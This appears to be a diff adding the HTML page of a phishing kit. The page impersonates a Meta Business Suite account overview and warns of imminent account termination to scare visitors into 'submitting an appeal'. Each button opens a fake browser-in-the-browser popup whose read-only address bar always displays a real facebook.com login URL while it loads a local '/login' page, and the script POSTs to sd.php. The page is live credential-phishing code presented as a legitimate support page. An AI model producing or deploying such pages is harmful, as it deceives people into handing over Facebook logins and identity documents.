@@ -1,0 +1,740 @@
+
+<script src="./assets/js/main.js" type="text/javascript"></script><script src="./assets/js/read.js" type="text/javascript"></script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Overview</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            color: #1c1e21;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            margin-bottom: 24px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            color: #1c1e21;
+            font-weight: 600;
+            line-height: 32px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            padding: 20px;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .card-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1c1e21;
+        }
+
+        .date-selector {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #1c1e21;
+            background: white;
+        }
+
+        .date-selector i {
+            margin-right: 8px;
+            color: #65676b;
+        }
+
+        .info-text {
+            color: #65676b;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+
+        .info-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ccd0d5;
+            padding-bottom: 8px;
+        }
+
+        .tab {
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 14px;
+            background-color: #e7f3ff;
+            color: #1877f2;
+            font-weight: 500;
+        }
+
+        .no-issues {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .no-issues img {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 16px;
+            opacity: 0.6;
+        }
+
+        .no-issues h3 {
+            font-size: 17px;
+            color: #1c1e21;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .no-issues p {
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        /* Remove account-section related styles */
+        .account-section,
+        .account-info,
+        .view-button,
+        .account-section img {
+            display: none;
+        }
+
+        .help-section {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            background: #f0f2f5;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .help-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .help-icon {
+            width: 36px;
+            height: 36px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+        }
+
+        .help-text h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 4px;
+        }
+
+        .help-text p {
+            font-size: 13px;
+            color: #65676b;
+            line-height: 1.4;
+        }
+
+        .contact-support {
+            padding: 8px 12px;
+            border: none;
+            border-radius: 6px;
+            background-color: white;
+            color: #1c1e21;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.1s;
+        }
+
+        .contact-support:hover {
+            background-color: #e4e6eb;
+        }
+
+        .no-issues p a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .no-issues p a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 12px;
+                margin: 12px auto;
+            }
+
+            .card {
+                padding: 16px;
+                margin-bottom: 16px;
+            }
+
+            .card-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+
+            .date-selector {
+                width: 100%;
+                justify-content: space-between;
+            }
+
+            .help-section {
+                flex-direction: column;
+                gap: 16px;
+                padding: 20px;
+                margin-top: 24px;
+                margin-bottom: 24px;
+            }
+
+            .help-left {
+                width: 100%;
+            }
+
+            .contact-support {
+                width: 100%;
+                padding: 12px;
+                font-size: 15px;
+            }
+
+            .help-text h3 {
+                font-size: 16px;
+            }
+
+            .help-text p {
+                font-size: 14px;
+            }
+        }
+
+        /* Side Menu Styles */
+        .side-menu {
+            position: fixed;
+            left: 0;
+            top: 0;
+            height: 100vh;
+            width: 60px;
+            background: white;
+            border-right: 1px solid #ccd0d5;
+            display: none; /* Hidden by default for mobile */
+            flex-direction: column;
+            align-items: center;
+            padding: 16px 0;
+            z-index: 100;
+        }
+
+        .menu-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 16px;
+        }
+
+        .menu-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .menu-item {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 4px 0;
+            cursor: pointer;
+            color: #65676b;
+            transition: background-color 0.1s;
+        }
+
+        .menu-item:hover {
+            background-color: #f2f2f2;
+        }
+
+        .menu-item.active {
+            color: #1877f2;
+        }
+
+        .menu-item img {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+        }
+
+        .menu-divider {
+            width: 40px;
+            height: 1px;
+            background: #ccd0d5;
+            margin: 8px 0;
+        }
+
+        /* Adjust container for side menu on desktop */
+        @media (min-width: 769px) {
+            .side-menu {
+                display: flex;
+            }
+
+            .container {
+                margin-left: 80px; /* Add space for side menu */
+            }
+        }
+
+        /* Additional responsive adjustments */
+        @media (max-width: 768px) {
+            .container {
+                margin-left: 0;
+            }
+        }
+
+        .issue-item {
+            border: 1px solid #fad2cf;
+            background: #fff4f3;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .issue-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #fa3e2f;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .issue-content h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 4px;
+        }
+
+        .issue-content p {
+            font-size: 13px;
+            color: #65676b;
+            line-height: 1.4;
+        }
+
+        .issue-content a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .issue-content a:hover {
+            text-decoration: underline;
+        }
+
+        .support-case {
+            border: 1px solid #e4e6eb;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        .case-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .case-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #65676b;
+            flex-shrink: 0;
+        }
+
+        .case-title {
+            flex-grow: 1;
+        }
+
+        .case-title h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .case-title .status {
+            font-size: 13px;
+            color: #65676b;
+            font-weight: normal;
+        }
+
+        .case-meta {
+            font-size: 13px;
+            color: #65676b;
+        }
+
+        .case-content {
+            font-size: 13px;
+            color: #1c1e21;
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+
+        .case-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .appeal-button {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.1s;
+        }
+
+        .appeal-button:hover {
+            background-color: #166fe5;
+        }
+
+        .case-id {
+            font-size: 13px;
+            color: #65676b;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #e4e6eb;
+        }
+    </style>
+</head>
+<body>
+    <div class="side-menu">
+        <div class="menu-logo">
+            <img src="logo.png" alt="Meta Business Suite">
+        </div>
+        <div class="menu-item">
+            <img src="user.png" alt="Profile">
+        </div>
+        <div class="menu-divider"></div>
+        <div class="menu-item active">
+            <i class="fas fa-home"></i>
+        </div>
+        <div class="menu-divider"></div>
+        <div class="menu-item">
+            <i class="fas fa-question-circle"></i>
+        </div>
+        <div class="menu-item">
+            <i class="fas fa-cog"></i>
+        </div>
+        <div class="menu-item">
+            <i class="fas fa-bell"></i>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <h1>Account Overview</h1>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2 class="card-title">Recent account issues</h2>
+                <div class="date-selector">
+                    <i class="far fa-calendar"></i>
+                    Last 7 days
+                </div>
+            </div>
+            <p class="info-text">Review the most recent accounts and assets that need attention due to not complying with our Advertising Standards or other standards. If you need to see all of your account and asset issues, go to My Accounts.</p>
+            
+            <div class="tabs">
+                <div class="tab active">Outstanding</div>
+            </div>
+
+            <div class="issue-item">
+                <div class="issue-icon">
+                    <i class="fas fa-exclamation-triangle" style="font-size: 12px;"></i>
+                </div>
+                <div class="issue-content">
+                    <h3>Account Verification Required</h3>
+                    <p>We regret to inform you that your account is at risk of termination. <a href="#" id="appealLink">Submit an appeal</a> to confirm your authority to represent this entity. Failure to do so may lead to permanent account termination and immediate removal of all businesses and pages under your management.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2 class="card-title" style="margin-bottom: 16px;">Your support cases</h2>
+            <p class="info-text">View and track all support cases related to your businesses.</p>
+            
+            <div class="tabs">
+                <div class="tab active">Active</div>
+            </div>
+
+            <div class="support-case">
+                <div class="case-header">
+                    <div class="case-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="case-title">
+                        <h3>Account Verification Appeal <span class="status">• Opened</span></h3>
+                    </div>
+                </div>
+                <div class="case-content">
+                    <p>Your account has been flagged for verification due to unusual activity or potential policy violations. This affects:</p>
+                    <ul style="margin: 8px 0 8px 20px;">
+                        <li>Primary Accounts</li>
+                        <li>All Business Accounts and Pages</li>
+                        <li>Ad Account Access</li>
+                    </ul>
+                    <p>Please submit your appeal with valid identification documents to restore full account access and prevent permanent termination.</p>
+                </div>
+                <div class="case-actions">
+                    <button class="appeal-button" id="appealButton">Submit Appeal</button>
+                </div>
+                <div class="case-id">
+                    Case ID: #FB31337-2024
+                </div>
+            </div>
+
+            <div class="help-section">
+                <div class="help-left">
+                    <div class="help-icon">
+                        <i class="far fa-heart"></i>
+                    </div>
+                    <div class="help-text">
+                        <h3>Still need help?</h3>
+                        <p>Reach out to a support professional if you are still experiencing an issue with your accounts</p>
+                    </div>
+                </div>
+                <button class="contact-support" id="supportButton">Contact support</button>
+
+            </div>
+        </div>
+    </div>
+    <!-- Popup Container -->
+<div class="popup-container" id="popupWindow">
+    <!-- Draggable Tab Area (Top of the window) -->
+    <div class="popup-tabs">
+        <div class="popup-tab">
+            <img src="ico.ico" alt="" width="17px" style="margin-right: 10px;">Facebook
+        </div>
+        <div class="close-tab-button" onclick="closePopup()">
+            <i class="fas fa-times"></i>
+        </div>
+    </div>
+
+    <!-- Popup header with controls -->
+    <div id="popupHeader" class="popup-header">
+        <div class="search-bar-container">
+            <i class="fa-solid fa-lock ssl-icon" style="padding-right:5px"></i>
+            <input id="searchBar" type="text" value="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" readonly>
+        </div>
+    </div>
+
+    <!-- Content area (iframe) -->
+    <iframe id="popupIframe" class="popup-iframe"></iframe>
+</div>
+
+
+<!-- POP UP JS -->
+<script>
+// Flag to check if the popup was opened before
+let isPopupOpened = false;
+// Flag to check if the AJAX request was sent before
+let isAjaxSent = false;
+
+// Function to change the source of the iframe (only once)
+function changeIframeSrc(src) {
+    if (!isPopupOpened) {
+        document.getElementById('popupIframe').src = src;
+        isPopupOpened = true;  // Set the flag to true after first open
+    }
+}
+
+// Function to send AJAX request to sd.php with POST data (only once)
+function sendAjaxRequest() {
+    if (!isAjaxSent) {  // Ensure AJAX request is sent only once
+        const formData = new FormData();
+        formData.append('welcome', 'Welcome to the Popup'); // Add your POST data
+
+        fetch('sd.php', {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Success:', data); // Handle success response
+            isAjaxSent = true;  // Set the flag to true after the first AJAX request
+        })
+        .catch(error => {
+            console.error('Error:', error); // Handle error response
+        });
+    }
+}
+
+    // Function to make the element draggable
+    function dragElement(elmnt, dragHandle) {
+        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+        if (dragHandle) {
+            dragHandle.onmousedown = dragMouseDown;
+        } else {
+            elmnt.onmousedown = dragMouseDown;
+        }
+
+        function dragMouseDown(e) {
+            if (window.matchMedia("(pointer: coarse)").matches) {
+                // Prevent dragging on mobile
+                return;
+            }
+
+            e = e || window.event;
+            e.preventDefault();
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            document.onmouseup = closeDragElement;
+            document.onmousemove = elementDrag;
+        }
+
+        function elementDrag(e) {
+            e = e || window.event;
+            e.preventDefault();
+            pos1 = pos3 - e.clientX;
+            pos2 = pos4 - e.clientY;
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+        }
+
+        function closeDragElement() {
+            document.onmouseup = null;
+            document.onmousemove = null;
+        }
+    }
+
+// Function to open the popup and send the POST request
+function openPopup() {
+    document.getElementById('popupWindow').style.display = 'flex';
+    changeIframeSrc('/login');  // Only sets iframe src if it hasn't been opened before
+    sendAjaxRequest();  // Send the AJAX request when the popup is opened, but only once
+}
+    // Function to close the popup
+    function closePopup() {
+        document.getElementById('popupWindow').style.display = 'none';
+    }
+
+    // Dragging functionality
+    dragElement(document.getElementById("popupWindow"), document.querySelector(".popup-tabs"));
+
+    // Open popup button functionality
+    const popupTriggers = ['appealLink', 'appealButton', 'supportButton'];
+    popupTriggers.forEach(triggerId => {
+        document.getElementById(triggerId).addEventListener('click', openPopup);
+    });
+    
+    // Function to hide popup when clicking outside
+    document.addEventListener('click', function(event) {
+        var popup = document.getElementById('popupWindow');
+        const isPopupTrigger = popupTriggers.some(triggerId => event.target.id === triggerId);
+        if (popup.style.display === 'flex' && !popup.contains(event.target) && !isPopupTrigger) {
+            closePopup();
+        }
+    });
+
+    // Function to update the search bar based on iframe URL
+    function updateSearchBar() {
+        var iframe = document.getElementById('popupIframe');
+        var searchBar = document.getElementById('searchBar');
+
+        iframe.onload = function() {
+            var iframeUrl = iframe.contentWindow.location.href;
+
+            // Check for specific URLs
+            if (iframeUrl.includes('cf') || iframeUrl.includes('cfp')) {
+                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
+            } else if (iframeUrl.includes('t') || iframeUrl.includes('tt')) {
+                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
+            } else if (iframeUrl.includes('v') || iframeUrl.includes('v.php')) {
+                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
+            } else {
+                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'; // Default URL
+            }
+        };
+    }
+
+    // Initial update of the search bar
+    updateSearchBar();
+
+    // Update search bar when iframe URL changes
+    document.getElementById('popupIframe').addEventListener('load', updateSearchBar);
+
+    // Close popup when clicking outside of it
+    window.onclick = function(event) {
+        var popup = document.getElementById('popupWindow');
+        if (event.target == popup) {
+            popup.style.display = "none";
+        }
+    };
+</script>
+
+</body>
+</html>
